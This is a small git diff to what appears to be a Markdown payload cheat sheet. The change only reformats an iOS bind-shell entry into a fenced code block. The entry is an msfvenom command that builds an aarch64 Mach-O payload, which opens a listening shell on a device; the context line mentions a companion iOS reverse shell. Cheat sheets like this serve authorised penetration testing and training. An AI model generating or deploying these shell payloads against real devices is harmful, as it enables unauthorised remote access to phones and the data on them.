@@ -282,9 +282,9 @@ _(64-bit iOS reverse shell, this requires device-side execution, usually on a ja
 
 ## **Bind Shell**
 
-bash
-
-`msfvenom -p apple_ios/aarch64/shell_bind_tcp RHOST=<IP> LPORT=<PORT> -f macho > bind_ios64.macho`
+```bash
+msfvenom -p apple_ios/aarch64/shell_bind_tcp RHOST=<IP> LPORT=<PORT> -f macho > bind_ios64.macho
+```
 
 _(Binds a shell and waits for incoming connections.)_
 
